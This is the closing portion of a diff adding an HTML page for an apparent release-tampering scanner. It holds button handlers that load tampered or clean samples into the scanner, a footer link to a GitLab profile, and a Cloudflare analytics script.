+document.getElementById("loadtampered").onclick = function(){ ta.value = SAMPLE_TAMPERED; render(scanReleaseText(ta.value)); };
+document.getElementById("loadclean").onclick = function(){ ta.value = SAMPLE_CLEAN; render(scanReleaseText(ta.value)); };
+document.getElementById("clearbtn").onclick = function(){ ta.value = ""; results.innerHTML = ""; summary.style.display = "none"; ta.focus(); };
+})();
+</script>
+<div id="ecosystem-footer"><a href="https://gitlab.com/Iceman2050">GitLab: 73 open-source security tools by Ingenious AI</a></div>
+<script src="ecosystem.js"></script>
+<!-- Cloudflare Web Analytics --><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "376c9de98060423683cfe15cec38f36b"}'></script><!-- End Cloudflare Web Analytics -->
+</body>
+</html>
